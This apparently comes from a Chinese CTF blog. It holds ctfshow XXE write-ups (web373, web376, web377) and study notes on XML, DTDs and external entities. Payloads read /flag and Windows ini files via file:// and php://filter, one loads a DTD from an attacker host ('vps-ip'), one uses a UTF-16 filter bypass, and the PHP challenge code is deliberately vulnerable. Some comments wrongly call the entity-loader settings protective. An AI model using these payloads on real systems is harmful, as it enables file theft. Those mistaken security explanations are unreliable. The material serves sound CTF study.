<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 及其大小写。emmmm… web375 的绕过方法好像也没有大小写绕过啊？</p>
<p>那就直接用 web375 的方法好了</p>
<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 和 <code>http</code> 及其大小写</p>
<p>我们先看一下原 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>有一个 <code>encoding=&quot;UTF-8&quot;</code> 的参数，那么我们就可以考虑除了 UTF-8 以外的其他编码，可以从 <a href="https://www.runoob.com/xml/xml-encoding.html">XML 编码 | 菜鸟教程 (runoob.com)</a> 中查看。</p>
<p>那我们取其中一个试试看：</p>
<p>先写一个编码转换的脚本（转 Unicode）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utf8_str = <span class="built_in">input</span>(<span class="string">&quot;utf-8:&quot;</span>)</span><br><span class="line"></span><br><span class="line">unicode_str = utf8_str.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unicode:&quot;</span>, unicode_str)</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&quot;\x001\x00.\x000\x00&quot;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&quot;\x00U\x00T\x00F\x00-\x008\x00&quot;\x00?\x00&gt;\x00&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>XXE学习记录</title>
    <url>/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>前言：</p>
<p>上上周的青少年CTF擂台挑战赛 2024 #Round 1中，有一道XXE的题目，结合我对 moectf 那道XXE的印象，感觉都是直接复制、黏贴答案模板后改改就出了，没有系统的认真学；趁着有想法的时候把 XXE 系统学个一遍。。。</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="什么是-XXE？"><a href="#什么是-XXE？" class="headerlink" title="什么是 XXE？"></a>什么是 XXE？</h2><p>XXE 全称是：XML External Entity，也就是 XML 外部实体注入攻击，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
<h2 id="XML-基础学习（-XXE-要从认识-XML-开始）："><a href="#XML-基础学习（-XXE-要从认识-XML-开始）：" class="headerlink" title="XML 基础学习（ XXE 要从认识 XML 开始）："></a>XML 基础学习（ XXE 要从认识 XML 开始）：</h2><p>XML指可扩展标记语言（EXtensible Markup Language）是一种标记语言，很类似 HTML。XML的设计宗旨是传输数据，而非显示数据。XML标签没有被预定义。需要自行定义标签。XML被设计为具有自我描述性。XML是 W3C 的推荐标准。</p>
<h3 id="XML-是不作为的："><a href="#XML-是不作为的：" class="headerlink" title="XML 是不作为的："></a>XML 是不作为的：</h3><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
<p>下面是 John 写给 George 的便签，存储为 XML ：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p>
<h2 id="DTD-："><a href="#DTD-：" class="headerlink" title="DTD ："></a>DTD ：</h2><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<h3 id="一些前置XML元素知识："><a href="#一些前置XML元素知识：" class="headerlink" title="一些前置XML元素知识："></a>一些前置XML元素知识：</h3><h4 id=""><a href="#" class="headerlink" title="&lt;!ELEMENT&gt;"></a><code>&lt;!ELEMENT&gt;</code></h4><p>在XML中，<code>&lt;!ELEMENT&gt;</code> 元素用于定义元素的结构和内容模型。具体来说，<code>&lt;!ELEMENT&gt;</code> 元素可以用来：</p>
<ol>
<li>定义元素的名称：<code>&lt;!ELEMENT&gt;</code> 元素指定了XML文档中允许出现的元素的名称。</li>
<li>定义元素的内容模型：<code>&lt;!ELEMENT&gt;</code> 元素可以指定元素的内容模型，即元素可以包含哪些子元素以及它们的顺序和数量。</li>
</ol>
<p>例如，下面是一个使用 <code>&lt;!ELEMENT&gt;</code> 元素定义元素的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT person (firstname, lastname, age)&gt;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>&lt;!ELEMENT&gt;</code> 元素定义了一个名为”person”的元素，它包含了三个子元素：firstname、lastname 和 age。这样就规定了”person”元素的结构和内容模型。</p>
<p>通过使用 <code>&lt;!ELEMENT&gt;</code> 元素，可以在XML文档中明确定义元素的结构，有助于确保文档的有效性和一致性。</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;!ENTITY&gt;"></a><code>&lt;!ENTITY&gt;</code></h4><p>在XML中，<code>&lt;!ENTITY&gt;</code> 元素用于定义实体。</p>
<h3 id="内部的-DOCTYPE-声明："><a href="#内部的-DOCTYPE-声明：" class="headerlink" title="内部的 DOCTYPE 声明："></a>内部的 DOCTYPE 声明：</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>带有 DTD 的 XML 文档实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h4 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h4><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档（note为根元素）。</p>
<p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”，如果是<code>&lt;!ELEMENT note ANY&gt;</code>则表示可以接受<strong>任何元素</strong></p>
<p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
<h3 id="外部文档声明："><a href="#外部文档声明：" class="headerlink" title="外部文档声明："></a>外部文档声明：</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure>

<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DTD的作用："><a href="#DTD的作用：" class="headerlink" title="DTD的作用："></a>DTD的作用：</h3><ul>
<li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li>
<li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li>
<li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li>
<li>您还可以使用 DTD 来验证您自身的数据。</li>
</ul>
<h3 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p>
<h4 id="实体类别与引用："><a href="#实体类别与引用：" class="headerlink" title="实体类别与引用："></a>实体类别与引用：</h4><h5 id="通用实体："><a href="#通用实体：" class="headerlink" title="通用实体："></a>通用实体：</h5><p>用 <code>&amp;实体名;</code> 引用的实体，他在 DTD 中定义，在 XML 文档中引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，实体 <code>&amp;file;</code> 引用了位于”file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini”路径下的文件。</p>
<h5 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h5><p>使用 <code>% 实体名</code>（<strong>这里面空格不能少</strong>） 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;message&gt;%an-element; %remote-dtd;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个示例中：</p>
<p>第一个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”an-element”，其内容是一个用于定义元素结构的字符串，指定了一个名为”mytag”的元素，它包含一个名为”subtag”的子元素。</p>
<p>第二个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”remote-dtd”，其内容是一个外部实体引用，指定了一个外部DTD文件的位置。</p>
<p>通过使用参数实体，我们可以在XML文档中定义可重复使用的片段，提高文档的可读性和可维护性。</p>
<p>实体根据引用方式，还可分为内部实体与外部实体</p>
<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注释：别忘记一个通用实体由三部分构成：一个和号 ( <code>&amp;</code> )，一个<code>实体名称</code>， 以及一个分号 ( <code>;</code> )</p>
<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体:"></a>外部实体:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>URL中能写哪些类型的外部实体呢？如图所示：</p>
<p><img src="https://s2.loli.net/2023/12/20/WiJR52dgfnx9Dpb.png" alt="image-20231008193523097"></p>
<p>实列：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然，还有一种引用方式是使用 引用 <strong>公用 DTD</strong> 的方法，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个在我们的攻击中也可以起到和 <code>SYSTEM</code> 一样的作用</p>
<h4 id="XML外部实体注入："><a href="#XML外部实体注入：" class="headerlink" title="XML外部实体注入："></a>XML外部实体注入：</h4><p>XML External Entity Injection 即 xml 外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p>
<h5 id="有回显读敏感文件"><a href="#有回显读敏感文件" class="headerlink" title="有回显读敏感文件"></a>有回显读敏感文件</h5><p>本题为 ctfshow web 373 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>以下是代码的简要解释：</p>
<ol>
<li><code>error_reporting(0);</code> - 禁用错误报告，这意味着将不会显示任何错误信息。</li>
<li><code>libxml_disable_entity_loader(false);</code> - 启用XML实体加载器，这是为了防止XML外部实体注入攻击。</li>
<li><code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code> - 从输入中获取XML文件的内容。</li>
<li><code>if(isset($xmlfile))&#123;...&#125;</code> - 检查是否成功获取XML文件内容。</li>
<li><code>$dom = new DOMDocument();</code> - 创建一个新的DOMDocument对象，用于处理XML文档。</li>
<li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code> - 加载XML文件内容到DOMDocument对象中，并禁用实体和DTD加载，以防止实体注入攻击。</li>
<li><code>$creds = simplexml_import_dom($dom);</code> - 将DOMDocument对象转换为SimpleXMLElement对象，以便于访问XML数据。</li>
<li><code>$ctfshow = $creds-&gt;ctfshow;</code> - 从XML数据中提取ctfshow元素的值。</li>
<li><code>echo $ctfshow;</code> - 将ctfshow元素的值输出到页面上。</li>
<li><code>highlight_file(__FILE__);</code> - 在页面上高亮显示当前PHP文件的源代码。</li>
</ol>
<p>贴个payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Ed3n [</span><br><span class="line">&lt;!ELEMENT Ed3n ANY&gt;</span><br><span class="line">	&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ed3n&gt;</span><br><span class="line">	&lt;ctfshow&gt;&amp;payload;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/Ed3n&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/11/YxXB7c3PtpydFEr.png" alt="image-20240311181553404"></p>
<p>但我看到了 K0rz3n 佬读取复杂文件名的操作，感觉分别可以应用在读取Linux和Windows的flag上。</p>
<p>以下为主要内容摘要：</p>
<blockquote>
<blockquote>
<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt; &gt; &amp; &quot;</code>  字符，CDATA 元素中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>

<p>可以输入任意字符除了 <code>]]&gt;</code> 不能嵌套<br>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA 包起来</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
<p>首先，找到问题出现的地方，问题出现在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;...</span><br><span class="line">&gt;&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>引用并不接受可能会引起 xml 格式混乱的字符（在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误），我们想在引用的两边加上 <code>&quot;&lt;![CDATA[&quot;和 “]]&gt;”</code> ，但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt;&lt;!DOCTYPE roottag [</span><br><span class="line">  &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&gt;]&gt;</span><br><span class="line">&gt;&lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在xml 中调用，那么要想在 DTD 中拼接，我们知道我们只有一种选择，就是使用参数实体</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过</p>
